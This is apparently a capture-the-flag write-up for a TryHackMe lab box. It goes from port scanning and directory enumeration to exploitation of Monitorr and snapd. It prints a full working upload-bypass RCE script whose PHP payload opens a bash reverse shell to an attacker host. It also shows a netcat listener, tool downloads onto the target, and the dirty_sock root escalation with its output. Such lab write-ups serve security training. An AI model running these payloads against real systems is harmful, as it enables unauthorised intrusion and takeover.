# Year of the JellyFish

**Date:** 10, May, 2021

**Author:** Dhilip Sanjay S

---

## Nmap Scan

```bash
# Nmap 7.91 scan initiated Thu Apr 29 15:52:55 2021 as: nmap -sV -sC -p- -vv -oN nmap_full 176.34.160.174
Nmap scan report for ec2-176-34-160-174.eu-west-1.compute.amazonaws.com (176.34.160.174)
Host is up, received reset ttl 31 (0.17s latency).
Scanned at 2021-04-29 15:52:55 IST for 468s
Not shown: 65528 filtered ports
Reason: 65527 no-responses and 1 admin-prohibited
PORT      STATE SERVICE  REASON         VERSION
21/tcp    open  ftp      syn-ack ttl 31 vsftpd 3.0.3
22/tcp    open  ssh      syn-ack ttl 31 OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3op12UwFIehC/VLx5tzBbmCUO/IzJlyueCj1/qP7tq3DcrBu9iQbC1gYemElU2FhqHH2KQr9MFrWRJgU4dH0iQOFld1WU9BNjfr6VcLOI+flLQstwWf1mJXEOdDjA98Cx+blYWG62qwXLiW+aq2jLfIZkVjJlp7OueNeocxE0P7ynTqJIadMfeNqNZ1Jc+s7aCBSg0NRSh0FsABAG+BSFhybnKXtApc+RG0QQ3vFpnU0k0PVZvg/qU/Eb6Oimm67d8hjclPbPpQoyvsdyOQG7yVS9eIglTr00ddw2Jn8wrapOa4TcBJGu9cgSgITHR8+htJ1LLj3EtsmJ0pErEv0B
80/tcp    open  http     syn-ack ttl 31 Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp   open  ssl/http syn-ack ttl 32 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/localityName=Bristol/emailAddress=robyn@robyns-petshop.thm
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/localityName=Bristol/emailAddress=robyn@robyns-petshop.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-29T10:15:16
| Not valid after:  2022-04-29T10:15:16
| MD5:   b8e2 3c83 9255 42e2 61bc 37cb 9905 c247
| SHA-1: 462c 9240 9d15 7db5 331b 60ac 168c 780c 6bbb 9e2c
| -----BEGIN CERTIFICATE-----
| MIIEPzCCAyegAwIBAgIUKkr9q+6kgXUlGTpFxf5kkC/ScEAwDQYJKoZIhvcNAQEL
| BQAwgZMxCzAJBgNVBAYTAkdCMRMwEQYDVQQIDApTb3V0aCBXZXN0MRAwDgYDVQQH
| DAdCcmlzdG9sMRcwFQYDVQQKDA5Sb2J5bnMgUGV0c2hvcDEbMBkGA1UEAwwScm9i
| eW5zLXBldHNob3AudGhtMScwJQYJKoZIhvcNAQkBFhhyb2J5bkByb2J5bnMtcGV0
| c2hvcC50aG0wHhcNMjEwNDI5MTAxNTE2WhcNMjIwNDI5MTAxNTE2WjCBkzELMAkG
| A1UEBhMCR0IxEzARBgNVBAgMClNvdXRoIFdlc3QxEDAOBgNVBAcMB0JyaXN0b2wx
| FzAVBgNVBAoMDlJvYnlucyBQZXRzaG9wMRswGQYDVQQDDBJyb2J5bnMtcGV0c2hv
| cC50aG0xJzAlBgkqhkiG9w0BCQEWGHJvYnluQHJvYnlucy1wZXRzaG9wLnRobTCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMT1qJ/4ZuY4zQtR2wGgSeV5
| I+z7BK/hH4I9B94ZCe3DVNHrR63KWw1SCzSa56MSd+Rkdf3wnql/7+nCcC3NEvAN
| lFp5M3OCmj5eN0hTXDV5mz+t50dOMwhUbtKK5JR74lhIaB3ZVlse1GhTqMZa4PBR
| /QsPtKHL6gEadSO0tUk7vIr+5SANBvNNnPd33P6sSaIaAXpadmrGa8EKNW1Pksm+
| SL4m0wWHJnPNHyvoQIKTD3e6lxbwIY1sFh+sWlQHFtCWPZhmomq0cMyHkn4ldpwy
| Bxk5uikckgOegmkslR+/NUTSXCw7f4jNvzNlGQhoMIrcsipLu2va5/Gg3MyRDG0C
| AwEAAaOBiDCBhTAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DBrBgNVHREEZDBighJy
| b2J5bnMtcGV0c2hvcC50aG2CG21vbml0b3JyLnJvYnlucy1wZXRzaG9wLnRobYIX
| YmV0YS5yb2J5bnMtcGV0c2hvcC50aG2CFmRldi5yb2J5bnMtcGV0c2hvcC50aG0w
| DQYJKoZIhvcNAQELBQADggEBAGCheA/RJPq/MvfdoHDHbsOdUFPAGe9CGcLk8Wky
| rjPD3ywu1pGO5rymQufEBpVB3oe5YTqEkCJlLO9OyxsWFuOV1RWsWBiavpomxV+P
| UVbo2ixGqaFxh5//vxI81NhSi57mGMfgFJ7lXnjQmJ33Oan5o+DDl4h4TaaeqEzE
| coXEyaCgzNUQONNPZctG60Rs985j6Vc7cutjmkZgnxsl+c8W/vIjvkRoERySpooZ
| hGJ3hJWeKo9J3NfCuioTaLcjNUk9zqBMcmuFW4rqPl8yckV6lpSJf4983qjrlJww
| 8bRC8+d8cvunxDSZNti4Ql20JaXMo4tQ/bcjksRsh6/rSj0=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8000/tcp  open  http-alt syn-ack ttl 31
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
| http-methods: 
|_  Supported Methods: GET
|_http-title: Under Development!
8096/tcp  open  unknown  syn-ack ttl 32
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:37 GMT
|     Server: Kestrel
|     Content-Length: 0
|     X-Response-Time-ms: 168
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:07 GMT
|     Server: Kestrel
|     Content-Length: 0
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 Found
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:08 GMT
|     Server: Kestrel
|     Content-Length: 0
|     Location: /web/index.html
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:24 GMT
|     Server: Kestrel
|     Content-Length: 0
|   Kerberos: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:26 GMT
|     Server: Kestrel
|     Content-Length: 0
|   LPDString: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:37 GMT
|     Server: Kestrel
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:09 GMT
|     Server: Kestrel
|     Content-Length: 0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Thu, 29 Apr 2021 10:29:25 GMT
|     Server: Kestrel
|_    Content-Length: 0
22222/tcp open  ssh      syn-ack ttl 31 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpLAsRYbJYyJ+bS8pAi+HpQupaD+Oo76UbITMFLP+pZyxM5ChxwyPbCYKIitboOoa3PWRe6V4UjBcOPtNujmv2tjCcETv/tp2QyuHPW6Go6ZzFDn0V8SUGhWIqwLge79Yp9FwG7y9tUxqnViQCJBfWtY5kJh11Iy/X4Arg1ifiT9FAExpVt3fgZl3HN6bxwyfFIQfxVqySgdQxSgqpVTU4Kc3pkZM1UL+c+kzfCYwiNJL0WHAYNl3u77H+Lp5J371BSJTWpaNS/bkS2KSqG/DPafCg4qhOn/rjDldHtQ3Eukcj0AGg/jBYbrYgAhsBXLJbhHTNTt4zrQe5sRArZ8ab
|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHcGmMvzfmx0EHLv5MLqqn0a4WVxxU7dcNq0F03HIZIY002BsPtaEXkbkcn5FdDsjDGuBWq+1JGB/xDI5py485o=
|   256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFpTk+WaMxq8E5ToT9RI4THsaxdarA4tACYEdoosbPD8
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.91%I=7%D=4/29%Time=608A8A78%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:015\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8096-TCP:V=7.91%I=7%D=4/29%Time=608A8A73%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clo
SF:se\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:07\x20GMT\r\nServer:\
SF:x20Kestrel\r\nContent-Length:\x200\r\n\r\n")%r(GetRequest,8D,"HTTP/1\.1
SF:\x20302\x20Found\r\nConnection:\x20close\r\nDate:\x20Thu,\x2029\x20Apr\
SF:x202021\x2010:29:08\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x20
SF:0\r\nLocation:\x20/web/index\.html\r\n\r\n")%r(HTTPOptions,8D,"HTTP/1\.
SF:1\x20302\x20Found\r\nConnection:\x20close\r\nDate:\x20Thu,\x2029\x20Apr
SF:\x202021\x2010:29:08\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x2
SF:00\r\nLocation:\x20/web/index\.html\r\n\r\n")%r(RTSPRequest,87,"HTTP/1\
SF:.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nConnection:\x20clos
SF:e\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:09\x20GMT\r\nServer:\x
SF:20Kestrel\r\nContent-Length:\x200\r\n\r\n")%r(Help,78,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nConnection:\x20close\r\nDate:\x20Thu,\x2029\x20Ap
SF:r\x202021\x2010:29:24\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x
SF:200\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:25
SF:\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n")%r(Termi
SF:nalServerCookie,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:25\x20GMT\r\nSer
SF:ver:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n")%r(TLSSessionReq,78,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nDate:\x20T
SF:hu,\x2029\x20Apr\x202021\x2010:29:25\x20GMT\r\nServer:\x20Kestrel\r\nCo
SF:ntent-Length:\x200\r\n\r\n")%r(Kerberos,78,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nConnection:\x20close\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x
SF:2010:29:26\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n
SF:")%r(FourOhFourRequest,8F,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnecti
SF:on:\x20close\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:37\x20GMT\r
SF:\nServer:\x20Kestrel\r\nContent-Length:\x200\r\nX-Response-Time-ms:\x20
SF:168\r\n\r\n")%r(LPDString,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\nDate:\x20Thu,\x2029\x20Apr\x202021\x2010:29:37\x20
SF:GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n");
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 29 16:00:43 2021 -- 1 IP address (1 host up) scanned in 468.47 seconds
```

## Check out all the open ports - Run gobuster on 8096 port

```bash
$ gobuster dir -u http://robyns-petshop.thm:8096/ -t 50 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://robyns-petshop.thm:8096/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/29 16:05:05 Starting gobuster in directory enumeration mode
===============================================================
/Health               (Status: 200) [Size: 7]
/artists              (Status: 401) [Size: 0]
/channels             (Status: 401) [Size: 0]
/collections          (Status: 405) [Size: 0]
/devices              (Status: 401) [Size: 0]
/genres               (Status: 401) [Size: 0]
/health               (Status: 200) [Size: 7]
/items                (Status: 401) [Size: 0]
/packages             (Status: 401) [Size: 0]
/persons              (Status: 401) [Size: 0]
/playlists            (Status: 405) [Size: 0]
/plugins              (Status: 401) [Size: 0]
/repositories         (Status: 401) [Size: 0]
/robots.txt           (Status: 302) [Size: 0] [--> web/robots.txt]
/scheduledtasks       (Status: 401) [Size: 0]                     
/sessions             (Status: 401) [Size: 0]                     
/trailers             (Status: 401) [Size: 0]                     
/users                (Status: 401) [Size: 0]                     
                                                                  
===============================================================
2021/04/29 16:06:15 Finished
===============================================================

```


## System Info
`curl http://robyns-petshop.thm:8096/system/info/public/`

```json
{
  "LocalAddress": "http://10.10.11.131:8096",
  "ServerName": "petshop",
  "Version": "10.7.2",
  "ProductName": "Jellyfin Server",
  "OperatingSystem": "Linux",
  "Id": "b6c698509b83439992b3e437c87f7fb5",
  "StartupWizardCompleted": true
}
```


## Add the alternative names in `/etc/hosts`
```bash
<MACHINE_IP> robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm
```
- We find that `robyns-petshop.thm` and `dev.robyns-petshop.thm` are the same content (Pico CMS)
- `beta.robyns-petshop.thm` doesn't seem to be exploitable:

```html
Under Construction
This site is under development. Please be patient.

If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. beta.robyns-petshop.thm/ID_HERE)
```

- `monitorr.robyns-petshop.thm` runs in PHP and seems to be not maintained currently. Link - [Monitorr - Github](https://github.com/Monitorr/Monitorr)

---

## Exploiting Monitorr
- Search for exploits using `searchsploit`:

```bash
$ searchsploit monitorr
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass                                                                                      | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)                                                                   | php/webapps/48980.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- We want an RCE to get access to shell, so mirror the RCE Exploit:

```bash
$ searchsploit -m php/webapps/48980.py
  Exploit: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/48980
     Path: /usr/share/exploitdb/exploits/php/webapps/48980.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/Desktop/CTF/TryHackMe/yearofthejellyfish/48980.py

$ mv 48980.py exploit-rce.py
```

- After making few modifications in the code, like `verify=False` and `print(reqData.text)`, run the exploit:

```html
python exploit-rce.py http://monitorr.robyns-petshop.thm 10.9.0.145 1234

<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: ../data/usrimg/ already exists.</div><div id='uploaderror'>ERROR:  was not uploaded.</div></div>

A shell script should be uploaded. Now we try to execute it.
```

## Figuring out the bypass filter
- Seems like thhe php extension is being blocked, so we'll try different extensions like `.php.gif`, `.phtml`. But still there was no luck.
- On monitoring the request in browser, there was a cookie `isHuman:1`
- So, include this cookie in the python exploit too.
- The final exploit:

```py
  GNU nano 5.4    exploit-rce.py                                                                      
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-moni>
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
        print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-L>

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"hello.php\"\r\nCo>
    cookies = {"isHuman" : "1"}
    reqData = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False)
    print(reqData.text)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/hello.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,app>
    print(requests.get(url, headers=headers, cookies=cookies, verify=False).text)
```

- But still the extensions with `.php`, `.phtml`, `.gif.php` gave the following error:

```html
div id='uploadreturn'><div id='uploaderror'>ERROR:  is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: ../data/usrimg/ already exists.</div><div id='uploaderror'>ERROR:  was not uploaded.</div></div>
```

- Finally `.gif.phtml` worked. Usually **443** won't be blocked, so use that port.
  - Final exploit with random characters filename

  ```py
  import requests
  import os
  import sys
  import random

  if len (sys.argv) != 4:
    print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
  else:
      url = sys.argv[1] + "/assets/php/upload.php"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

      filename = str(random.randint(1000, 10000))
      data = f"-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{filename}.gif.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

      cookies = {"isHuman" : "1"}

      reqData = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False)
      print(reqData.text)

      print ("A shell script should be uploaded. Now we try to execute it")
      url = sys.argv[1] + f"/assets/data/usrimg/{filename}.gif.phtml"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
      print(requests.get(url, headers=headers, cookies=cookies, verify=False).text)
    ```
    

    - Opening Netcat

    ```bash
    $ nc -lvnp 443

    listening on [any] 443 ...
    ```

    - Running the exploit

    ```bash
    $ python exploit-rce.py https://monitorr.robyns-petshop.thm <YOUR_IP> 443

    <div id='uploadreturn'>File pwn2own.gif.phtml is an image: <br><div id='uploadok'>File pwn2own.gif.phtml has been uploaded to: ../data/usrimg/pwn2own.gif.phtml</div></div>
    A shell script should be uploaded. Now we try to execute it
  ```

---

## Shell access & Flag 1

- Stabilizing the shell

```bash
www-data@petshop:/var/www/monitorr/assets/data$ which python3
which python3
/usr/bin/python3
www-data@petshop:/var/www/monitorr/assets/data$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ata$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@petshop:/var/www/monitorr/assets/data$ export TERM=xterm
export TERM=xterm
www-data@petshop:/var/www/monitorr/assets/data$ ^Z
[1]+  Stopped                 nc -lvnp 443
```

- Flag 1

```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ whoami
www-data
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cd ~
www-data@petshop:/var/www$ ls
dev  flag1.txt	html  monitorr
www-data@petshop:/var/www$ cat flag1.txt 
THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}
```

---

## Privilege Escalation & Root flag

- Permission denied for root directory

```bash
www-data@petshop:/$ cd root/
bash: cd: root/: Permission denied 
```
- Download & run `linpeas` on the target

```bash
www-data@petshop:curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh > linpeas.sh
www-data@petshop:/dev/shm$ ls
linpeas.sh
www-data@petshop:/dev/shm$ chmod +x linpeas.sh 
www-data@petshop:./linpeas.sh
```

- Linpeas didn't give much infor. Check the upgradable softwares 
```bash
www-data@petshop: apt list --upgradable

bind9-host/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
distro-info-data/bionic-updates,bionic-updates,bionic-security,bionic-security 0.37ubuntu0.10 all [upgradable from: 0.37ubuntu0.9]
dnsutils/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
grub-common/bionic-updates 2.02-2ubuntu8.23 amd64 [upgradable from: 2.02-2ubuntu8.21]
grub-pc/bionic-updates 2.02-2ubuntu8.23 amd64 [upgradable from: 2.02-2ubuntu8.21]
grub-pc-bin/bionic-updates 2.02-2ubuntu8.23 amd64 [upgradable from: 2.02-2ubuntu8.21]
grub2-common/bionic-updates 2.02-2ubuntu8.23 amd64 [upgradable from: 2.02-2ubuntu8.21]
jellyfin/unknown 10.7.5-1 all [upgradable from: 10.7.2-1]
jellyfin-server/unknown 10.7.5-1 amd64 [upgradable from: 10.7.2-1]
jellyfin-web/unknown 10.7.5-1 all [upgradable from: 10.7.2-1]
libbind9-160/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libdns-export1100/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libdns1100/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libhogweed4/bionic-updates,bionic-security 3.4-1ubuntu0.1 amd64 [upgradable from: 3.4-1]
libirs160/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libisc-export169/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libisc169/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libisccc160/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libisccfg160/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
liblwres160/bionic-updates,bionic-security 1:9.11.3+dfsg-1ubuntu1.15 amd64 [upgradable from: 1:9.11.3+dfsg-1ubuntu1.14]
libnettle6/bionic-updates,bionic-security 3.4-1ubuntu0.1 amd64 [upgradable from: 3.4-1]
libnss-systemd/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
libpam-systemd/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
libseccomp2/bionic-updates 2.5.1-1ubuntu1~18.04.1 amd64 [upgradable from: 2.4.3-1ubuntu3.18.04.3]
libsystemd0/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
libudev1/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
linux-generic/bionic-updates,bionic-security 4.15.0.142.129 amd64 [upgradable from: 4.15.0.140.127]
linux-headers-generic/bionic-updates,bionic-security 4.15.0.142.129 amd64 [upgradable from: 4.15.0.140.127]
linux-image-generic/bionic-updates,bionic-security 4.15.0.142.129 amd64 [upgradable from: 4.15.0.140.127]
linux-libc-dev/bionic-updates,bionic-security 4.15.0-142.146 amd64 [upgradable from: 4.15.0-140.144]
python3-distupgrade/bionic-updates,bionic-updates 1:18.04.44 all [upgradable from: 1:18.04.42]
snapd/bionic-updates,bionic-security 2.48.3+18.04 amd64 [upgradable from: 2.32.5+18.04]
sosreport/bionic-updates 4.1-1ubuntu0.18.04.1 amd64 [upgradable from: 3.9.1-1ubuntu0.18.04.3]
systemd/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
systemd-sysv/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
ubuntu-release-upgrader-core/bionic-updates,bionic-updates 1:18.04.44 all [upgradable from: 1:18.04.42]
udev/bionic-updates 237-3ubuntu10.47 amd64 [upgradable from: 237-3ubuntu10.45]
update-notifier-common/bionic-updates,bionic-updates 3.192.1.10 all [upgradable from: 3.192.1.9]
```

- `snapd` seems to be old and exploitable. Search for exploits using searchsploit or exploit db

```bash
$ searchsploit snapd
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)                                   | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)                                   | linux/local/46362.py
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

$ www-data@petshop:/dev/shm$ wget https://www.exploit-db.com/download/46362
--2021-05-10 10:01:32--  https://www.exploit-db.com/download/46362
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/txt]
Saving to: '46362'

46362                   [ <=>                ]  13.51K  --.-KB/s    in 0.01s   

2021-05-10 10:01:32 (1.36 MB/s) - '46362' saved [13831]

www-data@petshop:/dev/shm$ ls
46362  linpeas.sh
www-data@petshop:/dev/shm$ mv 46362 priv.py
```

## Root Access

```bash
www-data@petshop:/dev/shm$ chmod +x priv.py
www-data@petshop:python3 priv.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/bealvkxeje;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...

********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************

www-data@petshop:/dev/shm$ su dirty_sock
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@petshop:/dev/shm$ id
uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)

